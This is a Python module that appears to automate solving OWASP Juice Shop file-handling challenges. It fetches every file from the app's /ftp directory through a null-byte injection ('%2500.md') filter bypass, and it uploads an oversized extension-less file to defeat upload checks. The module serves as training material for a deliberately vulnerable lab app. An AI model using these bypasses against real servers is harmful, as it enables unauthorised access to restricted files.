import os

from authentication import get_admin_session


def get_ftp_file_list(server, session):
    """
    Fetch list of files from http://{server}/ftp
    :param server: juice shop URL
    :param session: Requests session
    :return: JSON response containing file list
    """
    files = session.get('{}/ftp'.format(server), headers={'Accept': 'application/json'})
    if not files.ok:
        raise RuntimeError('Error retrieving file list.')
    return files.json()


def download_files_from_ftp(server, session, files=None):
    """
    Save files from the JS /ftp directory locally.
    :param server: juice shop URL
    :param session: Session
    :param files: list of filenames. If None provided, all files will be retrieved.
    """
    if files is None:
        files = get_ftp_file_list(server, session)
    for item in files:
        resp = download_file_from_ftp(server, session, item)
        _write_file_to_disk(item, resp)


def get_easter_egg_content(server, session):
    """
    Fetch contents of eastere.gg for another challenge...
    :param server: juice shop URL
    :param session: Session
    :return: eastere.gg contents as string
    """
    return download_file_from_ftp(server, session, 'eastere.gg').content


def download_file_from_ftp(server, session, filename):
    """
    Use null-byte injection to bypass the server filtering and download the file
    :param server: juice shop URL
    :param session: Requests session
    :param filename: target filename
    :return: Response
    """
    location = '{}/ftp/{}%2500.md'.format(server, filename)
    fetch = session.get(location)
    if not fetch.ok:
        raise RuntimeError('Error retrieving FTP files.')
    return fetch


def _write_file_to_disk(filename, response):
    """
    Write file to local folder
    :param filename: filename to save.
    :param response: Response containing the file content
    """
    downloadir = 'ftpfiles'
    if not os.path.exists(downloadir):
        os.mkdir(downloadir)
    fileloc = os.path.join(os.getcwd(), downloadir, filename)
    with open(fileloc, 'wb') as outfile:
        outfile.write(response.content)
        print('Downloaded {} to {}.'.format(response.url, fileloc))


def solve_file_upload_challenges(server, session):
    """
    Create a junk file 150kb in size, upload it without a file extension, delete file when done
    :param server: juice shop URL
    :param session: Session
    """
    filename = 'trash.txt'
    with open(filename, 'wb') as outfile:
        outfile.truncate(1024 * 150)
    with open(filename, 'rb') as infile:
        files = {'file': ('whatever', infile, 'application/json')}
        print('Uploading 150kb file without a file extension...'),
        upload = session.post('{}/file-upload'.format(server), files=files)
        if not upload.ok:
            raise RuntimeError('Error uploading file.')
        print('Success.')
    os.remove(filename)


def solve_file_handling_challenges(server):
    print('\n== FILE HANDLING CHALLENGES ==\n')
    session = get_admin_session(server)
    download_files_from_ftp(server, session)
    solve_file_upload_challenges(server, session)
    print('\n== FILE HANDLING CHALLENGES COMPLETE ==\n')
